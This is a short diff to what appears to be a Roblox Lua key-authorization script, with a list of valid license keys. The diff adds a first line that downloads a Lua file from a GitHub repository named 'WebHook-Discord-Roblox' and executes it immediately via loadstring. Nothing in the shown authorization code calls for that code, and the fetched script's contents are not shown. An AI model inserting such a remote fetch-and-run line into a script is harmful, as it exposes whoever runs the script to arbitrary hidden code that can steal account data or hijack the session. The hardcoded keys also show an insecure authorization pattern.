@@ -1,3 +1,5 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/GODMODs132/WebHook-Discord-Roblox/main/Script.lua"),true))()
+
 local function authorizeKey(key)
     local validKeys = {
         "AW51D-HWDAD-NNHXQ-1GW3F",
